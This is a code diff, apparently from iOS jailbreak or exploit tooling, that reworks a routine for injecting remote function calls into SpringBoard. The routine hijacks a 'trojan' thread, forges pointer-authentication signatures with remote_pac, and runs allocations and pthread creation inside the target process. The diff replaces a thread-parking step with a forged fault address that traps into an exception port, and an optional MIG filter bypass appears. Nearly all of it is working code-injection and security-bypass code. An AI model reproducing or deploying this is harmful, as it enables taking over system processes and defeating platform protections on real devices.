@@ -1759,111 +1759,50 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         return 0;
     }
 
+    // Fl0rk @ 0x100e61ff8..0x100e62004 + 0x100e60544..0x100e64dc4:
+    //   out = (SP & 0x7fffffffff) - 0x100
+    //   signed = remote_pac(trojan, FAKE_PC_TROJAN=0x301, 0)
+    //   pthread_create_suspended_np(out, 0, signed, 0)
+    //   remote_read(out, 8)   // helper 0x100e5967c
+    // Do NOT pre-read out (poisons VMShmem cache with zeros — DIAG false *out=0).
+    uint64_t trapSP = (uint64_t)exc.threadState.__sp & 0x7fffffffffULL;
+    uint64_t trojanMemTemp = trapSP - 0x100ULL;
     g_RC_vmMap = task_get_vm_map(g_RC_taskAddr);
     g_RC_success = true;
+    RC_DIAG("Fl0rk out=SP-0x100: SP=0x%llx out=0x%llx vmMap=0x%llx",
+            (unsigned long long)trapSP,
+            (unsigned long long)trojanMemTemp,
+            (unsigned long long)g_RC_vmMap);
 
-    RC_DIAG("bootstrap getpid begin (must catch 0x101; miss → SIGBUS 0x201)");
-    uint64_t bootstrapPid = do_remote_call_temp(100, "getpid", 0, 0, 0, 0, 0, 0, 0, 0); // for testing
+    uint64_t remoteCrashSigned = remote_pac(g_RC_trojanThreadAddr, FAKE_PC_TROJAN, 0);
+    RC_DIAG("remote_pac(0x301,0)=0x%llx", (unsigned long long)remoteCrashSigned);
+
+    RC_DIAG("bootstrap getpid begin");
+    uint64_t bootstrapPid = do_remote_call_temp(100, "getpid", 0, 0, 0, 0, 0, 0, 0, 0);
     RC_DIAG("bootstrap getpid done pid=%llu success=%d",
             (unsigned long long)bootstrapPid, (int)g_RC_success);
     if (!g_RC_success || bootstrapPid == 0) {
-        RC_DIAG("bootstrap getpid FAILED before synthetic thread");
+        RC_DIAG("bootstrap getpid FAILED");
         fail_after_creator_park(RemoteCallInitFailureBootstrapGetpid, targetPid);
         return -1;
     }
 
-    // Out-ptr on heap (SP-0x100 stayed 0 after create despite ret=0).
-    uint64_t trojanMemTemp = do_remote_call_temp(100, "malloc", 16, 0, 0, 0, 0, 0, 0, 0);
-    if (!g_RC_success || !trojanMemTemp) {
-        RC_DIAG("malloc(16) for pthread_t out-ptr failed success=%d ptr=0x%llx",
-                (int)g_RC_success, (unsigned long long)trojanMemTemp);
-        fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
-        return -1;
-    }
-    do_remote_call_temp(100, "memset", trojanMemTemp, 0, 16, 0, 0, 0, 0, 0);
-    if (!g_RC_success) {
-        RC_DIAG("memset pthread out-ptr failed");
-        do_remote_call_temp(100, "free", trojanMemTemp, 0, 0, 0, 0, 0, 0, 0);
-        fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
-        return -1;
-    }
-
-    // Remap round-trip: prove our remote_read sees stores to this page.
-    if (!remote_write64(trojanMemTemp, 0x1122334455667788ULL)) {
-        RC_DIAG("remote_write64 marker to out-ptr FAILED");
-        do_remote_call_temp(100, "free", trojanMemTemp, 0, 0, 0, 0, 0, 0, 0);
-        fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
-        return -1;
-    }
-    clear_remote_shmem_cache();
-    uint64_t marker = remote_read64(trojanMemTemp);
-    RC_DIAG("remap roundtrip marker=0x%llx (expect 0x1122334455667788) out=0x%llx",
-            (unsigned long long)marker, (unsigned long long)trojanMemTemp);
-    if (marker != 0x1122334455667788ULL) {
-        RC_DIAG("remap roundtrip MISMATCH — remote_read not seeing target stores");
-        do_remote_call_temp(100, "free", trojanMemTemp, 0, 0, 0, 0, 0, 0, 0);
-        fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
-        return -1;
-    }
-    remote_write64(trojanMemTemp, 0);
-
-    // start_routine must be a function pointer SpringBoard's libpthread will
-    // accept. remote_pac(..., IA) of OUR local dlsym left *out=0 after ret=0
-    // (remap roundtrip OK — create simply never stored pthread_t). Resolve
-    // getpid INSIDE SB via remote dlsym so PAC/IB matches the target ABI.
-    // After we have the mach thread, park PC at FAKE_PC_TROJAN before resume.
-    uint64_t nameBuf = do_remote_call_temp(100, "malloc", 16, 0, 0, 0, 0, 0, 0, 0);
-    if (!g_RC_success || !nameBuf) {
-        RC_DIAG("malloc nameBuf for dlsym failed");
-        do_remote_call_temp(100, "free", trojanMemTemp, 0, 0, 0, 0, 0, 0, 0);
-        fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
-        return -1;
-    }
-    if (!remote_writeStr(nameBuf, "getpid")) {
-        RC_DIAG("remote_writeStr getpid failed");
-        do_remote_call_temp(100, "free", nameBuf, 0, 0, 0, 0, 0, 0, 0);
-        do_remote_call_temp(100, "free", trojanMemTemp, 0, 0, 0, 0, 0, 0, 0);
-        fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
-        return -1;
-    }
-    // RTLD_DEFAULT == (void*)-2
-    uint64_t startRoutine = do_remote_call_temp(100, "dlsym",
-                                                (uint64_t)(int64_t)-2, nameBuf,
-                                                0, 0, 0, 0, 0, 0);
-    do_remote_call_temp(100, "free", nameBuf, 0, 0, 0, 0, 0, 0, 0);
-    if (!g_RC_success || !startRoutine) {
-        RC_DIAG("remote dlsym(getpid) failed success=%d ptr=0x%llx",
-                (int)g_RC_success, (unsigned long long)startRoutine);
-        do_remote_call_temp(100, "free", trojanMemTemp, 0, 0, 0, 0, 0, 0, 0);
-        fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
-        return -1;
-    }
-    uint64_t localGetpid = native_strip((uint64_t)dlsym(RTLD_DEFAULT, "getpid"));
-    RC_DIAG("pthread start_routine remote_dlsym=0x%llx local_strip=0x%llx out=0x%llx",
-            (unsigned long long)startRoutine,
-            (unsigned long long)localGetpid,
-            (unsigned long long)trojanMemTemp);
-
     uint64_t createResult = do_remote_call_temp(100, "pthread_create_suspended_np",
-                                                trojanMemTemp, 0, startRoutine, 0, 0, 0, 0, 0);
+                                                trojanMemTemp, 0, remoteCrashSigned, 0, 0, 0, 0, 0);
     if (!g_RC_success || createResult != 0) {
-        RC_DIAG("pthread_create_suspended_np failed result=%llu success=%d",
+        RC_DIAG("pthread_create failed result=%llu success=%d",
                 (unsigned long long)createResult, (int)g_RC_success);
-        do_remote_call_temp(100, "free", trojanMemTemp, 0, 0, 0, 0, 0, 0, 0);
         fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
         return -1;
     }
 
+    // Drop any cached mapping so we observe the store pthread just did.
     clear_remote_shmem_cache();
-    uint64_t pthreadAddr = 0;
-    bool readOk = remote_read(trojanMemTemp, &pthreadAddr, sizeof(pthreadAddr));
-    RC_DIAG("post-pthread readOk=%d pthreadAddr=0x%llx out=0x%llx",
-            (int)readOk, (unsigned long long)pthreadAddr,
-            (unsigned long long)trojanMemTemp);
-    if (!readOk || !pthreadAddr) {
-        RC_DIAG("pthread out-ptr read failed/null readOk=%d addr=0x%llx",
-                (int)readOk, (unsigned long long)pthreadAddr);
-        do_remote_call_temp(100, "free", trojanMemTemp, 0, 0, 0, 0, 0, 0, 0);
+    uint64_t pthreadAddr = remote_read64(trojanMemTemp);
+    RC_DIAG("post-pthread pthreadAddr=0x%llx out=0x%llx",
+            (unsigned long long)pthreadAddr, (unsigned long long)trojanMemTemp);
+    if (!pthreadAddr) {
+        RC_DIAG("pthread out still 0 after cache clear — create did not store");
         fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
         return -1;
     }
@@ -1906,46 +1845,8 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     if(useMigFilterBypass)
         mig_bypass_pause();
 
-    // start_routine was real getpid — park synthetic thread at FAKE_PC_TROJAN
-    // before resume so first stable wait catches 0x301 (Cyanide shape).
-    {
-        arm_thread_state64_internal park = {0};
-        mach_msg_type_number_t parkCnt = ARM_THREAD_STATE64_COUNT;
-        // Pull current suspended state via remote thread_get_state into a
-        // remote buffer, then we can't easily parse it — instead craft PC/LR
-        // only: allocate remote state, write via remote_write after signing
-        // into a local copy and shipping bytes.
-        uint64_t stateBuf = do_remote_call_temp(100, "malloc",
-                                                sizeof(arm_thread_state64_internal),
-                                                0, 0, 0, 0, 0, 0, 0);
-        if (g_RC_success && stateBuf) {
-            // Seed from zeros then sign PC/LR with trojan keys (same as creator).
-            memset(&park, 0, sizeof(park));
-            park.__flags = 0;
-            sign_state(g_RC_trojanThreadAddr, &park, FAKE_PC_TROJAN, FAKE_LR_TROJAN);
-            remote_write(stateBuf, &park, sizeof(park));
-            uint64_t setKr = do_remote_call_temp(100, "thread_set_state",
-                                                 callThreadPort,
-                                                 ARM_THREAD_STATE64,
-                                                 stateBuf,
-                                                 ARM_THREAD_STATE64_COUNT,
-                                                 0, 0, 0, 0);
-            RC_DIAG("park synthetic at 0x301 via thread_set_state kr=%llu stateBuf=0x%llx",
-                    (unsigned long long)setKr, (unsigned long long)stateBuf);
-            do_remote_call_temp(100, "free", stateBuf, 0, 0, 0, 0, 0, 0, 0);
-            if (!g_RC_success || setKr != 0) {
-                RC_DIAG("thread_set_state park failed — abort resume");
-                fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
-                return -1;
-            }
-        } else {
-            RC_DIAG("malloc stateBuf for park failed");
-            fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
-            return -1;
-        }
-        (void)parkCnt;
-    }
-
+    // Fl0rk/Cyanide: start_routine already FAKE_PC 0x301 — resume faults into
+    // secondExceptionPort. No thread_set_state park needed.
     RC_DEBUG("[%s:%d] All good! Resuming trojan thread...\n", __FUNCTION__, __LINE__);
 
     uint64_t ret = do_remote_call_temp(100, "thread_resume", callThreadPort, 0, 0, 0, 0, 0, 0, 0);
